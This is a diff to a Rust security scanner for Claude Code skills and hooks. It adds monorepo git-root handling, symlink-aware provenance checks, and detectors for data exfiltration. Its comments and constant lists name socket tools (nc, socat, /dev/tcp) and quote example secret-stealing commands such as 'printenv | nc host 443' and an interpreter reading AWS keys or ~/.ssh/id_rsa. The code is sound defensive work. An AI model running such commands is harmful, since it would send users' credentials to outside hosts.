@@ -127,11 +127,15 @@ impl Scanner for SkillsScanner {
             project_dirs.push(cwd);
         }
         let project_dirs = project_dirs_excluding_home(project_dirs, &home);
+        // Each project with the root its skills are contained in: the enclosing git work
+        // tree (a monorepo app registered at mono/apps/web shares skills from mono/shared).
+        let project_dirs: Vec<(PathBuf, PathBuf)> =
+            project_dirs.into_iter().map(|d| (project_containment_root(&d, &home), d)).collect();
 
         // Claude Code project commands
-        for dir in &project_dirs {
+        for (root, dir) in &project_dirs {
             let project_commands = dir.join(".claude").join("commands");
-            scan_skill_dir(&project_commands, "claude-code", "project", Some(dir), &ctx, &mut results);
+            scan_skill_dir(&project_commands, "claude-code", "project", Some(root), &ctx, &mut results);
         }
 
         // Claude Code hooks: ~/.claude/hooks/ and project-level .claude/hooks/
@@ -150,8 +154,8 @@ impl Scanner for SkillsScanner {
         // actually install were never walked.
         scan_skill_bundles(&home.join(".claude").join("skills"), "claude-code", "global", None, &ctx, &mut results);
         scan_skill_bundles(&home.join(".claude").join("plugins"), "claude-code-plugin", "global", None, &ctx, &mut results);
-        for dir in &project_dirs {
-            scan_skill_bundles(&dir.join(".claude").join("skills"), "claude-code", "project", Some(dir), &ctx, &mut results);
+        for (root, dir) in &project_dirs {
+            scan_skill_bundles(&dir.join(".claude").join("skills"), "claude-code", "project", Some(root), &ctx, &mut results);
         }
 
         // Dedupe by path, with the DIRECTORY canonicalized (not the file: two links to one
@@ -190,6 +194,25 @@ fn project_dirs_excluding_home(dirs: Vec<PathBuf>, home: &Path) -> Vec<PathBuf> 
             !real_home.starts_with(&real) && !home.starts_with(d)
         })
         .collect()
+}
+
+/// The root a project's skill links are contained in, and whose `.git` answers their
+/// provenance: the enclosing git work tree (the nearest ancestor of `dir` with a `.git`
+/// entry, checked by existence only), so a monorepo app registered at `mono/apps/web`
+/// may link `mono/shared/skills/lint` and have it read and analysed. HOME and its
+/// ancestors are never a containment root (a dotfiles repository at `~/.git` would make
+/// every file under HOME "inside the project"); without a repository it is `dir` itself.
+pub(crate) fn project_containment_root(dir: &Path, home: &Path) -> PathBuf {
+    let real_home = canon_or_lexical(home);
+    for a in dir.ancestors() {
+        if home.starts_with(a) || real_home.starts_with(a) {
+            break;
+        }
+        if std::fs::symlink_metadata(a.join(".git")).is_ok() {
+            return a.to_path_buf();
+        }
+    }
+    dir.to_path_buf()
 }
 
 /// Cap on qualifying files (manifests, commands, scripts) per bundle walk.
@@ -509,7 +532,7 @@ fn build_skill(
     {
         // Unknown (git timed out, the repository is unsafe to spawn git in, or the scan's
         // git budget is spent) records nothing rather than a guess.
-        if let Some(tracked) = crate::scanners::git_tracked_state(path) {
+        if let Some(tracked) = git_tracked_through_links(path, root) {
             let git = if tracked { "tracked" } else { "untracked" };
             provenance.get_or_insert_with(SkillProvenance::default).git = Some(git.into());
         }
@@ -539,6 +562,24 @@ fn build_skill(
         unrestricted_bash,
         provenance,
     }
+}
+
+/// Whether a project skill file is committed. A file reached through a committed
+/// symlinked directory (`.claude/skills/lint -> ../../shared/skills/lint`) is not itself
+/// in the index; it is committed when that link is and its real path is.
+fn git_tracked_through_links(path: &Path, root: &Path) -> Option<bool> {
+    use crate::scanners::git_tracked_state;
+    if git_tracked_state(path)? {
+        return Some(true);
+    }
+    let link = path
+        .ancestors()
+        .skip(1)
+        .take_while(|a| a.starts_with(root) && *a != root)
+        .find(|a| std::fs::symlink_metadata(a).is_ok_and(|m| m.file_type().is_symlink()));
+    let Some(link) = link else { return Some(false) };
+    let Ok(real) = std::fs::canonicalize(path) else { return Some(false) };
+    Some(git_tracked_state(link)? && git_tracked_state(&real)?)
 }
 
 /// Recursively discover skill BUNDLES: a `SKILL.md` manifest plus the scripts shipped
@@ -896,8 +937,13 @@ fn body_after_frontmatter(text: &str) -> &str {
 /// encoder: "base64 decode to shell" is kept only when the decode feeds a shell or
 /// interpreter, and "cross-channel: encoding + network" only when encoded output is
 /// what a network client sends. Obfuscated matches are kept as they are.
+///
+/// A medium row (`printenv`, an `API_KEY` name) is escalated to high when the command
+/// hands data to a network sender ([`feeds_network_sender`]): `printenv | nc host 443`
+/// is the exfiltration the row is named after, not a lookup. Data piped to a raw socket
+/// (nc, socat, telnet, `/dev/tcp`) is an exfiltration hit even when no row matched.
 fn dynamic_command_hits(cmd: &str) -> Vec<crate::models::RulesFileFinding> {
-    crate::scanners::rules_files::check_dangerous_patterns(cmd)
+    let mut hits: Vec<crate::models::RulesFileFinding> = crate::scanners::rules_files::check_dangerous_patterns(cmd)
         .into_iter()
         .filter(|f| {
             if f.pattern.contains("(obfuscated") {
@@ -911,7 +957,86 @@ fn dynamic_command_hits(cmd: &str) -> Vec<crate::models::RulesFileFinding> {
             }
             true
         })
-        .collect()
+        .collect();
+    if pipes_into_socket(cmd) && !hits.iter().any(|f| f.pattern.starts_with("data exfiltration")) {
+        hits.push(crate::models::RulesFileFinding {
+            severity: "high".into(),
+            pattern: "data exfiltration pattern (piped to a network socket)".into(),
+        });
+    }
+    if feeds_network_sender(cmd) {
+        for f in &mut hits {
+            if matches!(f.severity.as_str(), "medium" | "low") {
+                f.severity = "high".into();
+            }
+        }
+    }
+    hits
+}
+
+/// Raw network socket clients: they only ever send what they are given.
+const SOCKET_CLIENTS: &[&str] = &["nc", "ncat", "netcat", "socat", "telnet"];
+/// Interpreters whose one-liners can make a network request themselves.
+const SCRIPT_INTERPRETERS: &[&str] = &["python", "python2", "python3", "node", "ruby", "perl", "deno", "bun", "php"];
+/// What an interpreter one-liner's HTTP or socket request looks like.
+const SCRIPT_NET_MARKERS: &[&str] = &[
+    "urlopen", "urllib", "requests.", "http.client", "httpx", "fetch(", "https.request", "http.request", "https.get",
+    "http.get", "net::http", "net/http", "socket", "open-uri", "lwp::", "axios",
+];
+
+/// Data piped (or redirected) into a raw network socket: a pipeline stage after the
+/// first that runs nc, ncat, socat or telnet, or a bash `/dev/tcp` / `/dev/udp`
+/// redirection.
+pub fn pipes_into_socket(cmd: &str) -> bool {
+    let lower = cmd.to_ascii_lowercase();
+    lower.contains("/dev/tcp/")
+        || lower.contains("/dev/udp/")
+        || pipe_stages(&lower).iter().skip(1).any(|s| SOCKET_CLIENTS.contains(&stage_program(s).as_str()))
+}
+
+/// Local data handed to a network sender: a pipeline stage after the first whose program
+/// is a network client (curl, wget, nc, ncat, socat, telnet, httpie, xh), a network
+/// client whose arguments carry a command substitution (`curl https://x/$(cat key)`), a
+/// `/dev/tcp` redirection, or an interpreter one-liner (python, node, ruby, perl, ...)
+/// that makes an HTTP or socket request.
+pub fn feeds_network_sender(cmd: &str) -> bool {
+    let lower = cmd.to_ascii_lowercase();
+    if pipes_into_socket(&lower) {
+        return true;
+    }
+    let stages = pipe_stages(&lower);
+    if stages.iter().skip(1).any(|s| SENDERS.contains(&stage_program(s).as_str())) {
+        return true;
+    }
+    let words = || lower.split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | '"' | '\''));
+    // A URL's last path segment (`https://x/curl`) is not a program.
+    let base = |w: &str| if w.contains("://") { String::new() } else { w.rsplit('/').next().unwrap_or(w).to_string() };
+    let substitutes = lower.contains("$(") || lower.contains('`');
+    if substitutes && words().any(|w| SENDERS.contains(&base(w).as_str())) {
+        return true;
+    }
+    script_makes_request(&lower)
+}
+
+/// An interpreter one-liner (python, node, ruby, perl, ...) that makes an HTTP or socket
+/// request.
+fn script_makes_request(lower: &str) -> bool {
+    lower
+        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | '"' | '\''))
+        .filter(|w| !w.contains("://"))
+        .any(|w| SCRIPT_INTERPRETERS.contains(&w.rsplit('/').next().unwrap_or(w)))
+        && SCRIPT_NET_MARKERS.iter().any(|m| lower.contains(m))
+}
+
+/// An interpreter one-liner that makes a network request carrying the environment or a
+/// file it reads (`urlopen(... + os.environ['AWS_SECRET_ACCESS_KEY'])`, `fetch(...,
+/// {body: process.env.X})`, `open('~/.ssh/id_rsa')`).
+pub fn script_sends_local_data(cmd: &str) -> bool {
+    let lower = cmd.to_ascii_lowercase();
+    script_makes_request(&lower)
+        && ["os.environ", "getenv", "process.env", "env[", "open(", "readfile", "file.read", "io.read"]
+            .iter()
+            .any(|m| lower.contains(m))
 }
 
 /// Pipeline stages, split on `|` (not `||`).
